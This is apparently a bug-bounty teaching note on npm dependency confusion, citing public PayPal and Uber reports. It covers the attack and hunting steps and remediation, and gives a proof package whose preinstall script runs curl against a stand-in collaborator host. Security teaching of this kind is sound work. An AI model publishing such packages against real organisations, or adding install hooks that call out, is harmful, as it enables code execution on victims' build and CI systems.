---
name: rce-npm-dependency-confusion
description: RCE via internal npm package names resolved from the public registry (dependency confusion) — publish a malicious package with an internal private name. Teaches dependency-confusion attacks and how to detect internal package names.
sources: hackerone_public
report_count: 1
---

# RCE via npm Dependency Confusion

**Report**: PayPal — "RCE via npm misconfiguration (internal libs from public registry)" (hackerone.com/reports/925585), and Uber #1007014. Same class as the famous `dns-packet`/Alex Birsan supply-chain research.

## Why it matters (the new lesson)
If a company's build installs a private package (`@corp/internal-lib`) but the registry/npmrc doesn't pin it to a private registry, publishing a **same-named package on public npm** gets pulled in and its install/lifecycle scripts (or runtime code) execute — RCE on build servers/CI, often with production deploy rights.

## How it works
1. Leak an internal package name: find `package.json` with a private `@scope/name`, a lockfile referencing it, or a leaked `.npmrc`/registry URL.
2. Publish `@scope/name` to public npm with a version higher than the internal one (or matching the semver range) plus a `preinstall`/`postinstall` script.
3. Next build pulls your package → script runs on CI.

## How to hunt for it
1. Recon: exposed `package.json`, `yarn.lock`/`package-lock.json`, source maps, leaked CI logs for `@scope/` private names.
2. Confirm the name is not on public npm (`npm view @scope/name` → 404).
3. Report the confusion (or, with program permission, publish a benign proof).

## Payload (proof package)
```json
{ "name": "@corp/internal-lib", "version": "99.0.0",
  "scripts": { "preinstall": "curl https://YOUR-COLLABORATOR.burpcollaborator.net/poc" } }
```

## Fix
Pin private registry via `.npmrc`/`registry=` + `@scope:registry=`; use scope namespaces; lock versions; verify package provenance.
